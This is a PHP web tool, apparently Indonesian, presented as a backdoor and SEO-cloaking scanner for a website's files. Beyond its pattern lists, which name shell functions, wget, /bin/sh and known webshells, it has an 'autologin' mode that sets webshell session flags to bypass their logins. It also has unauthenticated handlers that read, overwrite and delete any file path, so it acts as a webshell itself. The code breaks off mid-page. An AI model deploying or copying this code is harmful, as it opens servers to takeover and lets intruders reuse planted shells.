<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

@session_start();

/**
 * Default path:
 * - Kalau DOCUMENT_ROOT ada & valid → pakai itu
 * - Kalau tidak → pakai folder tempat file ini berada
 */
$default_path = (isset($_SERVER['DOCUMENT_ROOT']) && is_dir($_SERVER['DOCUMENT_ROOT']))
    ? rtrim($_SERVER['DOCUMENT_ROOT'], '/\\')
    : __DIR__;

$path = $_GET['path'] ?? $default_path;
$view = $_GET['view'] ?? null;
$bpage = isset($_GET['bpage']) ? (int)$_GET['bpage'] : 1;
$cpage = isset($_GET['cpage']) ? (int)$_GET['cpage'] : 1;
if ($bpage < 1) $bpage = 1;
if ($cpage < 1) $cpage = 1;
$per_page = 10;

// FILTER NAMA FILE
$filter_name = $_GET['filter_name'] ?? '';
$folder_mode = $_GET['folder_mode'] ?? 'all';
$selected_folder = $_GET['selected_folder'] ?? '';


/**
 * MODE: AUTOLOGIN (session bypass + redirect ke webshell)
 * URL: ?action=autologin&target=/full/path/ke/file.php
 */
if (isset($_GET['action']) && $_GET['action'] === 'autologin' && !empty($_GET['target'])) {
    $targetFile = $_GET['target'];

    if (file_exists($targetFile)) {

        // SESUAIKAN key ini dengan pola webshell yang sering kamu temui
        $sessionKeys = [
            'logged_in',
            'd5587b78418472a83b6a4b208c081080',
            'auth',
            'authenticated',
            'admin',
            'user_logged_in',
        ];

        foreach ($sessionKeys as $k) {
            $_SESSION[$k] = true;
        }

        $docRoot = isset($_SERVER['DOCUMENT_ROOT']) ? rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') : '';
        if ($docRoot && strpos($targetFile, $docRoot) === 0) {
            $relative = substr($targetFile, strlen($docRoot));
        } else {
            $relative = $targetFile;
        }

        $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https://' : 'http://';
        $url = $scheme . $_SERVER['HTTP_HOST'] . $relative;

        header('Location: ' . $url);
        exit;
    }

    echo 'Target file tidak ditemukan';
    exit;
}

/**
 * WORDLIST PATTERN BACKDOOR (LENGKAP)
 */
function getBackdoorPatterns() {
    return [
        // Execution functions
        'eval', 'system', 'shell_exec', 'exec', 'passthru', 'proc_open', 
        'popen', 'pcntl_exec', 'assert', 'create_function', 'call_user_func',
        'call_user_func_array', 'array_map', 'array_filter', 'usort', 'uasort',
        
        // Obfuscation functions
        'base64_decode', 'str_rot13', 'gzinflate', 'gzuncompress', 'gzdecode',
        'strrev', 'str_replace', 'preg_replace', 'convert_uudecode',
        
        // File operations (suspicious)
        'file_put_contents', 'fwrite', 'fputs', 'file_get_contents', 'readfile',
        'include', 'require', 'include_once', 'require_once',
        
        // Network & remote
        'curl_exec', 'fsockopen', 'pfsockopen', 'stream_socket_client',
        'socket_create', 'socket_connect',
        
        // Variable functions
        '$$', '@$', 'extract', 'parse_str', 'mb_parse_str', 'import_request_variables',
        
        // Suspicious strings
        'FilesMan', 'WSO', 'r57shell', 'c99shell', 'b374k', 'IndoXploit',
        'mini_shell', 'webshell', 'shell_exec', 'passthru', '/bin/sh',
        '/bin/bash', 'cmd.exe', 'powershell', 'wget', 'curl -O',
        
        // Hex/octal patterns (common in obfuscated code)
        '\\x', '\\0', 'chr(', 'pack(',
        
        // Dangerous PHP tags
        '<script language="php"', '<?=',
        
        // Database dumps & injections
        'mysql_query', 'mysqli_query', 'pg_query', 'mssql_query',
        'SELECT * FROM', 'UNION SELECT', 'DROP TABLE', 'INSERT INTO',
        
        // Backdoor-specific
        'error_reporting(0)', '@ini_set', 'set_time_limit(0)',
        'ignore_user_abort', 'ini_restore',
        
        // Common backdoor variable names
        '$_REQUEST', '$_POST', '$_GET', '$_COOKIE', '$_SERVER',
        '$GLOBALS', 'getenv', 'putenv',
        
        // Encryption/Encoding
        'openssl_decrypt', 'mcrypt_decrypt', 'gzdeflate', 'gzcompress',
        
        // Reflection & dynamic code
        'ReflectionFunction', 'ReflectionMethod', 'call_user_method',
        
        // Suspicious function combinations
        'eval(base64_decode', 'eval(gzinflate', 'assert(base64_decode',
        'preg_replace("/e"', 'preg_replace(\'/e\'',
        
        // Antivirus evasion
        'disable_functions', 'disable_classes', 'safe_mode',
    ];
}

function getFolders($path) {
    $folders = [];
    if (!is_dir($path) || !is_readable($path)) return $folders;

    $items = @scandir($path);
    if ($items === false) return $folders;

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;

        $fullpath = $path . '/' . $item;
        if (is_dir($fullpath) && is_readable($fullpath)) {
            $folders[] = $item;
        }
    }

    sort($folders);
    return $folders;
}

/**
 * GOOGLEBOT CLOAKING PATTERNS (SEO HACKER)
 */
/**
 * GOOGLEBOT CLOAKING PATTERNS (SEO HACKER - LENGKAP)
 */
function getGooglebotCloakingPatterns() {
    return [
        // === USER AGENT CHECK ===
        'Googlebot', 'googlebot', 'Googlebot/', 'Googlebot-Image',
        'strpos.*Googlebot', 'stripos.*Googlebot', 'preg_match.*Googlebot',
        'HTTP_USER_AGENT.*Googlebot', '$_SERVER.*Googlebot', 'strtolower.*googlebot',
        'Googlebot-Mobile', 'Googlebot-Image', 'AdsBot-Google',
        
        // === IP RANGE GOOGLEBOT ===
        '66.249.', '209.85.', '64.233.', '72.14.', '216.58.', '216.239.',
        '207.126.', '173.194.', '74.125.', '38.101.', '38.102.',
        
        // === REVERSE DNS ===
        'gethostbyaddr', 'gethostbyname.*googlebot', 'checkdnsrr.*googlebot',
        'dns_get_record.*googlebot', 'gethostbynamel.*googlebot',
        
        // === CONDITIONAL LOGIC ===
        'if.*Googlebot.*==', 'elseif.*Googlebot', 'else.*Googlebot',
        'is_googlebot', 'is_bot', 'is_crawler', 'is_google',
        'bot_detected', 'googlebot_ip', 'googlebot_verify',
        
        // === JAPANESE KEYWORD HACK ===
        'カジノ', 'ギャンブル', 'スロット', 'パチンコ', 'ポーカー',
        '日本語', '韓国語', 'アフィリエイト', 'スロットガメ', 'スロット88',
        'slot gacor', 'slot88', 'agen slot', 'slot online',
        
        // === CASINO/SPAM ===
        'viagra', 'casino', 'poker', 'slot', 'bitcoin', 'crypto',
        'online casino', 'sports betting', 'blackjack', 'roulette',
        
        // === OBFUSCATED ===
        'goog1ebot', 'g00glebot', 'googleb0t', 'G00glebot',
        'base64_decode.*Googlebot', 'gzinflate.*Googlebot', 'gzuncompress.*Googlebot',
        
        // === MALWARE CLOAKING ===
        'auto_prepend_file.*googlebot', 'error_reporting.*googlebot',
        'include.*if.*Googlebot', 'require.*Googlebot',
        
        // === REFERER CHECK ===
        'google.com/search', 'google.co.id/search', 'google.co.jp/search',
        '$_SERVER.*HTTP_REFERER.*google',
        
        // === FSOCKOPEN MALWARE ===
        'fsockopen.*googlebot', 'curl_exec.*googlebot',
        
        // === ROBOTS.TXT CLOAKING ===
        'robots.txt.*Googlebot', 'RewriteCond.*Googlebot',
        
        // === VARIABLE NAMES ===
        '$is_googlebot', '$googlebot_detected', '$bot_type',
    ];
}

/**
 * Scan khusus Googlebot Cloaking (SEO HACKER)
 */
function scanGooglebotCloaking($dir) {
    $patterns = getGooglebotCloakingPatterns();
    $cloaking_files = [];

    if (!is_dir($dir) || !is_readable($dir)) return $cloaking_files;

    try {
        $directoryIterator = new RecursiveDirectoryIterator(
            $dir,
            FilesystemIterator::SKIP_DOTS | FilesystemIterator::CURRENT_AS_FILEINFO
        );

        $filter = new RecursiveCallbackFilterIterator($directoryIterator, function ($current) {
            if ($current->isDir()) {
                return is_readable($current->getPathname());
            }
            return true;
        });

        $iterator = new RecursiveIteratorIterator(
            $filter,
            RecursiveIteratorIterator::SELF_FIRST
        );
    } catch (Throwable $e) {
        return $cloaking_files;
    }

    foreach ($iterator as $file) {
        try {
            if (!$file->isFile()) continue;

            $path = $file->getPathname();
            if (!is_readable($path)) continue;

            if (strtolower($file->getExtension()) === 'php') {
                $content = @file_get_contents($path);
                if ($content === false) continue;

                foreach ($patterns as $pattern) {
                    if (stripos($content, $pattern) !== false) {
                        $cloaking_files[] = $path;
                        break;
                    }
                }
            }
        } catch (Throwable $e) {
            continue;
        }
    }

    return $cloaking_files;
}

function scanBackdoor($dir) {
    $patterns = getBackdoorPatterns();
    $backdoors = [];

    if (!is_dir($dir) || !is_readable($dir)) return $backdoors;

    try {
        $directoryIterator = new RecursiveDirectoryIterator(
            $dir,
            FilesystemIterator::SKIP_DOTS | FilesystemIterator::CURRENT_AS_FILEINFO
        );

        $filter = new RecursiveCallbackFilterIterator($directoryIterator, function ($current) {
            if ($current->isDir()) {
                return is_readable($current->getPathname());
            }
            return true;
        });

        $iterator = new RecursiveIteratorIterator(
            $filter,
            RecursiveIteratorIterator::SELF_FIRST
        );
    } catch (Throwable $e) {
        return $backdoors;
    }

    foreach ($iterator as $file) {
        try {
            if (!$file->isFile()) continue;

            $path = $file->getPathname();
            if (!is_readable($path)) continue;

            if (strtolower($file->getExtension()) === 'php') {
                $content = @file_get_contents($path);
                if ($content === false) continue;

                foreach ($patterns as $pattern) {
                    if (stripos($content, $pattern) !== false) {
                        $backdoors[] = $path;
                        break;
                    }
                }
            }
        } catch (Throwable $e) {
            continue;
        }
    }

    return $backdoors;
}

function scanChmodFiles($dir, &$total_chmod = 0) {
    $results = [];
    $total_chmod = 0;

    if (!is_dir($dir)) return $results;

    try {
        $directoryIterator = new RecursiveDirectoryIterator(
            $dir,
            FilesystemIterator::SKIP_DOTS | FilesystemIterator::CURRENT_AS_FILEINFO
        );

        $filter = new RecursiveCallbackFilterIterator($directoryIterator, function ($current) use (&$results) {
            if ($current->isDir()) {
                $path = $current->getPathname();
                if (!is_readable($path)) {
                    $results[] = [
                        'path' => $path,
                        'perms' => 'DENIED',
                        'link' => '?path=' . urlencode($_GET['path'] ?? '') . '&view=' . urlencode($path)
                    ];
                    return false;
                }
                return true;
            }
            return true;
        });

        $iterator = new RecursiveIteratorIterator(
            $filter,
            RecursiveIteratorIterator::SELF_FIRST
        );
    } catch (Throwable $e) {
        return $results;
    }

    foreach ($iterator as $file) {
        try {
            if (!$file->isFile()) continue;

            $path = $file->getPathname();
            clearstatcache(true, $path);

            $perms = @fileperms($path);
            if ($perms === false) continue;

            $mode = $perms & 0777;
            if ($mode === 0111 || $mode === 0555) {
                $results[] = [
                    'path' => $path,
                    'perms' => sprintf('%04o', $mode),
                    'link' => '?path=' . urlencode($_GET['path'] ?? '') . '&view=' . urlencode($path)
                ];
                $total_chmod++;
            }
        } catch (Throwable $e) {
            continue;
        }
    }

    return $results;
}

/**
 * Jalankan scan + filter
 */
$scan_path = $path;

if ($folder_mode === 'perscript' && !empty($view)) {
    $scan_path = dirname($view);
} elseif ($folder_mode === 'per_page' && !empty($selected_folder)) {
    $scan_path = $path . '/' . $selected_folder;
}

$backdoors = is_dir($scan_path) ? scanBackdoor($scan_path) : [];
$googlebot_files = is_dir($scan_path) ? scanGooglebotCloaking($scan_path) : [];

$total_chmod = 0;
$chmod_files = is_dir($scan_path) ? scanChmodFiles($scan_path, $total_chmod) : [];

if ($filter_name !== '') {
    $backdoors = array_filter($backdoors, function($file) use ($filter_name) {
        return strtolower(basename($file)) === strtolower($filter_name);
    });

    $googlebot_files = array_filter($googlebot_files, function($file) use ($filter_name) {
        return strtolower(basename($file)) === strtolower($filter_name);
    });

    $chmod_files = array_filter($chmod_files, function($row) use ($filter_name) {
        return strtolower(basename($row['path'])) === strtolower($filter_name);
    });
}

$backdoors = array_values($backdoors);
$googlebot_files = array_values($googlebot_files);
$chmod_files = array_values($chmod_files);

$folders = getFolders($path);
$bpage = isset($_GET['bpage']) ? max(1, (int)$_GET['bpage']) : 1;
$cpage = isset($_GET['cpage']) ? max(1, (int)$_GET['cpage']) : 1;
$modpage = isset($_GET['modpage']) ? max(1, (int)$_GET['modpage']) : 1;

$total_backdoors = count($backdoors);
$total_googlebot = count($googlebot_files);
$total_chmod = count($chmod_files);

$offset_backdoor = ($bpage - 1) * $per_page;
$offset_googlebot = ($cpage - 1) * $per_page;
$offset_chmod = ($modpage - 1) * $per_page;

$page_files = array_slice($backdoors, $offset_backdoor, $per_page);
$page_googlebot_files = array_slice($googlebot_files, $offset_googlebot, $per_page);
$page_chmod_files = array_slice($chmod_files, $offset_chmod, $per_page);

if (isset($_POST['open_all_backdoor'], $_POST['open_files']) && is_array($_POST['open_files'])) {
    $urls = [];
    foreach ($_POST['open_files'] as $file) {
        if (file_exists($file) && is_readable($file)) {
            $urls[] = showFileUrl($file);
        }
    }

    echo '<script>window.addEventListener("load", function(){';
    foreach ($urls as $u) {
        echo 'window.open(' . json_encode($u) . ', "_blank");';
    }
    echo '});</script>';
}

if (isset($_POST['delete_selected_backdoor'], $_POST['files'])) {
    $files = json_decode($_POST['files'], true);

    if (is_array($files)) {
        foreach ($files as $file) {
            if (file_exists($file) && is_writable($file)) {
                @unlink($file);
            }
        }
    }

    exit;
}

/**
 * Helper: tampilkan isi file
 */
function showFileContent($file) {
    if (file_exists($file) && is_readable($file)) {
        return htmlspecialchars(file_get_contents($file));
    }
    return '';
}

/**
 * Helper: buat URL dari path file
 */
function showFileUrl($file) {
    $docRoot = isset($_SERVER['DOCUMENT_ROOT']) ? rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') : '';
    if ($docRoot && strpos($file, $docRoot) === 0) {
        $relative_path = substr($file, strlen($docRoot));
    } else {
        $relative_path = $file;
    }

    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https://' : 'http://';
    return $scheme . $_SERVER['HTTP_HOST'] . $relative_path;
}

/**
 * Helper: pagination dengan filter
 */
function getPagination($total, $per_page, $current_page, $page_param, $path, $filter_name = '', $folder_mode = '', $selected_folder = '') {
    $total_pages = max(1, (int)ceil($total / $per_page));
    if ($total_pages <= 1) return '';

    $paramsBase = [
        'path' => $path,
        'filter_name' => $filter_name,
        'folder_mode' => $folder_mode,
        'selected_folder' => $selected_folder,
    ];

    $html = '<div class="btn-group btn-group-sm w-100" role="group">';

    $params = $paramsBase;
    $params[$page_param] = 1;
    $html .= "<a href='?" . htmlspecialchars(http_build_query($params)) . "' class='btn btn-outline-primary'>⏮ 1</a>";

    if ($current_page > 1) {
        $params = $paramsBase;
        $params[$page_param] = $current_page - 1;
        $html .= "<a href='?" . htmlspecialchars(http_build_query($params)) . "' class='btn btn-outline-primary'>←</a>";
    }

    $start = max(1, $current_page - 2);
    $end = min($total_pages, $current_page + 2);

    for ($i = $start; $i <= $end; $i++) {
        $params = $paramsBase;
        $params[$page_param] = $i;
        $active = ($i == $current_page) ? 'btn-primary' : 'btn-outline-primary';
        $html .= "<a href='?" . htmlspecialchars(http_build_query($params)) . "' class='btn $active'>$i</a>";
    }

    if ($current_page < $total_pages) {
        $params = $paramsBase;
        $params[$page_param] = $current_page + 1;
        $html .= "<a href='?" . htmlspecialchars(http_build_query($params)) . "' class='btn btn-outline-primary'>→</a>";
    }

    $params = $paramsBase;
    $params[$page_param] = $total_pages;
    $html .= "<a href='?" . htmlspecialchars(http_build_query($params)) . "' class='btn btn-outline-primary'>$total_pages ⏭</a>";

    $html .= '</div>';
    return $html;
}

/**
 * Edit file
 */
if (isset($_POST['edit_file'], $_POST['file_content'])) {
    $file = $_POST['edit_file'];
    if (file_exists($file) && is_writable($file)) {
        if (file_put_contents($file, $_POST['file_content']) !== false) {
            echo "<div class='alert alert-success'>File berhasil disimpan!</div>";
        } else {
            echo "<div class='alert alert-danger'>Gagal menyimpan file!</div>";
        }
    } else {
        echo "<div class='alert alert-danger'>File tidak ditemukan atau tidak bisa diubah!</div>";
    }
}

/**
 * Delete file
 */
if (isset($_POST['delete_file'])) {
    $file = $_POST['delete_file'];
    if (file_exists($file) && is_writable($file)) {
        if (unlink($file)) {
            echo "<div class='alert alert-success'>File berhasil dihapus!</div>";
            $view = null;
        } else {
            echo "<div class='alert alert-danger'>Gagal menghapus file!</div>";
        }
    } else {
        echo "<div class='alert alert-danger'>File tidak ditemukan atau tidak bisa dihapus!</div>";
    }
}

?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Scanner Backdoor Pro</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            font-family: 'Segoe UI', sans-serif;
        }
        .main-container { margin-top: 30px; }
        .card {
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            border: none;
        }
        .card:hover { transform: translateY(-5px); transition: all 0.3s ease; }.card-header { border-radius: 15px 15px 0 0 !important; color: white; }
        .btn-primary { background: linear-gradient(45deg, #3498db, #2980b9); border: none; }
        .btn-primary:hover { background: linear-gradient(45deg, #2980b9, #3498db); }
        .btn-success { background: linear-gradient(45deg, #27ae60, #229954); border: none; }
        .btn-success:hover { background: linear-gradient(45deg, #229954, #27ae60); }
        .btn-danger { background: linear-gradient(45deg, #e74c3c, #c0392b); border: none; }
        .btn-danger:hover { background: linear-gradient(45deg, #c0392b, #e74c3c); }
        .btn-warning { background: linear-gradient(45deg, #f1c40f, #f39c12); border: none; }
        .btn-warning:hover { background: linear-gradient(45deg, #f39c12, #f1c40f); }
        .list-group-item {
            cursor: pointer;
            font-size: 0.85em;
            border-left: 4px solid #3498db;
            transition: all 0.3s;
        }
        .list-group-item:hover { background-color: #f8f9fa; transform: translateX(5px); }
        .url-box {
            font-family: monospace;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            padding: 15px;
            border-radius: 10px;
            word-break: break-all;
            margin-bottom: 15px;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
        }
        .row.equal-height > [class*="col"] {
            display: flex;
            flex-direction: column;
        }
        .card.h-100 { height: 100%; }
        .flex-fill { flex: 1; }

        .script-editor-full {
            min-height: 520px;
        }
        .card-body.script-editor-body {
            display: flex;
            flex-direction: column;
        }
        #edit-content {
            width: 100%;
            min-height: 420px;
            resize: none;
            border: none;
            outline: none;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            line-height: 1.4;
            tab-size: 4;
            background: #f8f9fa;
        }
        .textarea-editable {
            background: #fff !important;
        }
    </style>
</head>
<body>
<div class="container-fluid main-container">

    <div class="card h-100">
    <div class="card-header bg-primary d-flex justify-content-between align-items-center">
        <h5 class="card-title mb-0">
            <i class="fas fa-folder-search me-2"></i>Path Scanner
        </h5>
        <button class="btn btn-sm btn-light" type="button" data-bs-toggle="collapse" data-bs-target="#scannerFilters" aria-expanded="false" aria-controls="scannerFilters">
            <i class="fas fa-chevron-down"></i>
        </button>
    </div>

    <div class="collapse" id="scannerFilters">
        <div class="card-body">
            <form method="get">
                <div class="mb-3">
                    <label class="form-label">Path Target:</label>
                    <input type="text" class="form-control" name="path" value="<?= htmlspecialchars($path ?? '') ?>" placeholder="Contoh: /var/www/html">
                </div>

                <div class="mb-3">
                    <label class="form-label">Filter Nama File:</label>
                    <input type="text" class="form-control" name="filter_name" value="<?= htmlspecialchars($filter_name ?? '') ?>" placeholder="index.php">
                </div>

                <div class="mb-3">
                    <label class="form-label">Mode Folder:</label>
                    <select name="folder_mode" class="form-control">
                        <option value="all" <?= ($folder_mode ?? '') === 'all' ? 'selected' : '' ?>>All</option>
                        <option value="per_page" <?= ($folder_mode ?? '') === 'per_page' ? 'selected' : '' ?>>Per Page</option>
                        <option value="perscript" <?= ($folder_mode ?? '') === 'perscript' ? 'selected' : '' ?>>Per Script</option>
                    </select>
                </div>

                <?php if (($folder_mode ?? '') === 'per_page'): ?>
                        <div class="mb-3">
                            <label class="form-label">Pilih Folder:</label>
                            <select name="selected_folder" class="form-control">
                                <option value="">-- Pilih Folder --</option>
                                <?php foreach (($folders ?? []) as $folder): ?>
                                <option value="<?= htmlspecialchars($folder) ?>" <?= ($selected_folder ?? '') === $folder ? 'selected' : '' ?>>
                                    <?= htmlspecialchars($folder) ?>
                                </option>
                                <?php endforeach; ?>
                            </select>
                        </div>
                        <?php endif; ?>

                <button type="submit" class="btn btn-primary w-100">
                    <i class="fas fa-search me-2"></i>Scan Sekarang
                </button>
            </form>
        </div>
    </div>
</div>

        <div class="row g-3">

    <div class="col-md-3">
        <div class="card h-100">
            <div class="card-header bg-danger">
                <h5 class="card-title mb-0">
                    <i class="fas fa-skull me-2"></i>Backdoor
                    <span class="badge bg-dark"><?= (int)($total_backdoors ?? 0) ?></span>
                    <small class="text-white-50">(Hal. <?= (int)($bpage ?? 1) ?>)</small>
                </h5>
            </div>
            <div class="card-body flex-fill d-flex flex-column">
                <div class="mb-2 d-flex gap-2 flex-wrap align-items-center">
                    <button type="button" class="btn btn-sm btn-outline-primary" id="select-page-btn">
                        Select Page
                    </button>
                    <button type="button" class="btn btn-sm btn-warning" id="move-to-list-btn">
                        Move to list
                    </button>
                    <button type="button" class="btn btn-sm btn-primary" onclick="openSelectedTabs()">
                        Open All
                    </button>
                </div>

                <ul class="list-group list-group-flush flex-fill" style="max-height: 300px; overflow-y: auto;" id="backdoor-open-form">
                    <?php if (!empty($page_files)): ?>
                        <?php foreach ($page_files as $file):
                            $link = "?path=" . urlencode($path ?? '') .
                                "&bpage=" . urlencode($bpage) .
                                "&cpage=" . urlencode($cpage) .
                                "&filter_name=" . urlencode($filter_name ?? '') .
                                "&folder_mode=" . urlencode($folder_mode ?? '') .
                                "&selected_folder=" . urlencode($selected_folder ?? '') .
                                "&view=" . urlencode($file);
                        ?>
                        <li class="list-group-item list-group-item-danger d-flex align-items-start gap-2">
                            <input type="checkbox"
                                   class="backdoor-open-checkbox"
                                   data-url="<?= htmlspecialchars(showFileUrl($file)) ?>"
                                   data-file="<?= htmlspecialchars($file) ?>">
                            <div>
                                <a href="<?= $link ?>" class="text-danger text-decoration-none">
                                    <i class="fas fa-file-code me-2"></i><?= htmlspecialchars(basename($file)) ?>
                                </a><br>
                                <small class="text-muted"><?= htmlspecialchars($file) ?></small>
                            </div>
                        </li>
                        <?php endforeach; ?>
                    <?php else: ?>
                        <li class="list-group-item text-success">
                            <i class="fas fa-shield-alt me-2"></i>CLEAN - No backdoor
                        </li>
                    <?php endif; ?>
                </ul>

                <?php if ($total_backdoors > $per_page): ?>
                <div class="mt-2 p-2 bg-light rounded pagination-backdoor">
                    <?= getPagination($total_backdoors, $per_page, $bpage, 'bpage', $path, $filter_name, $folder_mode, $selected_folder ?? '') ?>
                </div>
                <?php endif; ?>
            </div>
        </div>
    </div>

    <div class="col-md-3">
        <div class="card h-100">
            <div class="card-header bg-warning text-dark">
                <h5 class="card-title mb-0">
                    <i class="fas fa-robot me-2"></i>Cloaking
                    <span class="badge bg-dark"><?= (int)($total_googlebot ?? 0) ?></span>
                    <small class="text-dark">(Hal. <?= (int)($cpage ?? 1) ?>)</small>
                </h5>
            </div>
            <div class="card-body flex-fill d-flex flex-column">
                <ul class="list-group list-group-flush flex-fill" style="max-height: 300px; overflow-y: auto;">
                    <?php if (!empty($page_googlebot_files)): ?>
                        <?php foreach ($page_googlebot_files as $file):
                            $link = "?path=" . urlencode($path ?? '') .
                                "&bpage=" . urlencode($bpage) .
                                "&cpage=" . urlencode($cpage) .
                                "&filter_name=" . urlencode($filter_name ?? '') .
                                "&folder_mode=" . urlencode($folder_mode ?? '') .
                                "&selected_folder=" . urlencode($selected_folder ?? '') .
                                "&view=" . urlencode($file);
                        ?>
                        <li class="list-group-item list-group-item-warning">
                            <a href="<?= $link ?>" class="text-warning text-decoration-none">
                                <i class="fas fa-robot me-2"></i><?= htmlspecialchars(basename($file)) ?>
                            </a><br>
                            <small class="text-muted"><?= htmlspecialchars($file) ?></small>
                        </li>
                        <?php endforeach; ?>
                    <?php else: ?>
                        <li class="list-group-item text-success">
                            <i class="fas fa-shield-alt me-2"></i>CLEAN - No cloaking
                        </li>
                    <?php endif; ?>
                </ul>

                <?php if ($total_googlebot > $per_page): ?>
                <div class="mt-2 p-2 bg-light rounded pagination-cloaking">
                    <?= getPagination($total_googlebot, $per_page, $cpage, 'cpage', $path, $filter_name, $folder_mode, $selected_folder ?? '') ?>
                </div>
                <?php endif; ?>
            </div>
        </div>
    </div>

    <div class="col-md-3">
        <div class="card h-100">
            <div class="card-header bg-secondary">
                <h5 class="card-title mb-0">
                    <i class="fas fa-list me-2"></i>Selected List
                    <span class="badge bg-dark" id="selected-count">0</span>
                </h5>
            </div>
            <div class="card-body d-flex flex-column">
                <ul class="list-group list-group-flush flex-fill" id="selected-list" style="max-height: 300px; overflow-y: auto;"></ul>

                <div class="mt-2 d-flex gap-2 flex-wrap">
                    <button type="button" class="btn btn-sm btn-outline-secondary" onclick="clearSelectedList()">
                        Clear list
                    </button>
                    <button type="button" class="btn btn-sm btn-danger" onclick="deleteSelectedFiles()">
                        Buang file backdoor
                    </button>
                </div>
            </div>
        </div>
    </div>

    <div class="col-md-3">
        <div class="card h-100">
            <div class="card-header bg-info">
                <h5 class="card-title mb-0">
                    <i class="fas fa-file-alt me-2"></i>Chmod
                    <span class="badge bg-dark"><?= (int)($total_chmod ?? 0) ?></span>
                </h5>
            </div>
            <div class="card-body d-flex flex-column">
                <ul class="list-group list-group-flush flex-fill" id="chmod-list" style="max-height: 300px; overflow-y: auto;">
                    <?php if (!empty($page_chmod_files)): ?>
                        <?php foreach ($page_chmod_files as $item): ?>
                        <li class="list-group-item list-group-item-info">
                            <small class="text-muted"><?= htmlspecialchars($item['perms'] ?? '') ?></small><br>
                            <a href="<?= htmlspecialchars($item['link'] ?? '#') ?>" class="text-info text-decoration-none">
                                <i class="fas fa-file me-2"></i><?= htmlspecialchars(basename($item['path'] ?? '')) ?>
                            </a><br>
                            <small class="text-muted"><?= htmlspecialchars($item['path'] ?? '') ?></small>
                        </li>
                        <?php endforeach; ?>
                    <?php else: ?>
                        <li class="list-group-item text-success">
                            <i class="fas fa-shield-alt me-2"></i>No chmod issue
                        </li>
                    <?php endif; ?>
                </ul>
            </div>
        </div>
    </div>

</div>

        <div class="col-md-3"></div>
    </div>

    <div class="row equal-height">
        <div class="col-md-3">
            <div class="card h-100">
                <div class="card-header bg-info">
                    <h5 class="card-title mb-0"><i class="fas fa-edit me-2"></i>Edit File</h5>
                </div>
                <div class="card-body flex-fill d-flex flex-column">
                    <?php if (!empty($view)): ?>
                    <div class="url-box mb-2 p-2 small flex-fill">
                        <strong>URL:</strong><br>
                        <small><?= htmlspecialchars(showFileUrl($view)) ?></small>
                    </div>
                    <div class="btn-group-vertical flex-fill mb-2" role="group">
                        <button onclick="openPreview()" class="btn btn-success btn-sm mb-1">
                            <i class="fas fa-external-link-alt"></i> Buka
                        </button>
                        <button onclick="copyUrl()" class="btn btn-secondary btn-sm mb-1">
                            <i class="fas fa-copy"></i> Copy
                        </button>
                        <button onclick="autoLoginBypass()" class="btn btn-warning btn-sm">
                            <i class="fas fa-key"></i> Bypass
                        </button>
                    </div>
                    <?php else: ?>
                    <div class="text-center text-muted flex-fill d-flex align-items-center justify-content-center flex-column">
                        <i class="fas fa-eye-slash fa-2x mb-2"></i><br><small>Pilih file</small>
                    </div>
                    <?php endif; ?>
                </div>
            </div>
        </div>

        <div class="col-md-9">
    <div class="card h-100 script-editor-full">
        <div class="card-header d-flex justify-content-between align-items-center bg-secondary">
            <div>
                <h6 class="mb-0 text-white">
                    <i class="fas fa-file-code me-2"></i>
                    <?= !empty($view) ? htmlspecialchars(basename($view)) : 'Script Editor' ?>
                    <?php if (!empty($view)): ?>
                    <small class="text-white-50 ms-2">Size: <?= number_format(filesize($view) / 1024, 1) ?> KB</small>
                    <?php endif; ?>
                </h6>
            </div>
            <button class="btn btn-sm btn-outline-light" onclick="toggleEdit()" id="toggle-btn" type="button">
                ✏️ Edit
            </button>
        </div>

        <div class="card-body p-0 flex-fill">
            <?php if (!empty($view)): ?>
            <div class="row g-0 h-100">
                <div class="col-md-6 border-end">
                    <textarea id="edit-content" class="form-control w-100 h-100 p-3" readonly><?= htmlspecialchars(file_get_contents($view)) ?></textarea>
                </div>
                <div class="col-md-6">
                    <iframe id="preview-frame" src="<?= htmlspecialchars(showFileUrl($view)) ?>" class="w-100 h-100" style="min-height: 520px; border: 0;"></iframe>
                </div>
            </div>
            <?php else: ?>
            <div class="d-flex align-items-center justify-content-center h-100 text-muted">
                <div class="text-center">
                    <i class="fas fa-file-code fa-4x mb-4 opacity-50"></i>
                    <h4>Pilih file dari Backdoor/Cloaking</h4>
                    <p class="lead">Klik file untuk lihat isi dan URL</p>
                </div>
            </div>
            <?php endif; ?>
        </div>

        <?php if (!empty($view)): ?>
        <div class="card-footer bg-light d-flex justify-content-between align-items-center">
            <form method="post" class="d-inline" id="save-form">
                <input type="hidden" name="edit_file" value="<?= htmlspecialchars($view) ?>">
                <textarea name="file_content" style="display:none;" id="hidden-content"><?= htmlspecialchars(file_get_contents($view)) ?></textarea>
                <button type="submit" class="btn btn-success btn-sm" id="save-btn">
                    <i class="fas fa-save me-1"></i>Save Changes
                </button>
            </form>

            <div class="btn-group btn-group-sm">
                <button onclick="copyAll()" class="btn btn-outline-secondary" type="button" title="Copy All">
                    <i class="fas fa-copy"></i>
                </button>
                <form method="post" class="d-inline" onsubmit="return confirm('Delete <?= htmlspecialchars(basename($view)) ?> ?')" style="margin:0;">
                    <input type="hidden" name="delete_file" value="<?= htmlspecialchars($view) ?>">
                    <button type="submit" class="btn btn-danger" title="Delete">
                        <i class="fas fa-trash"></i>
                    </button>
                </form>
                <a href="<?= htmlspecialchars(showFileUrl($view)) ?>" target="_blank" class="btn btn-outline-primary" title="Open">
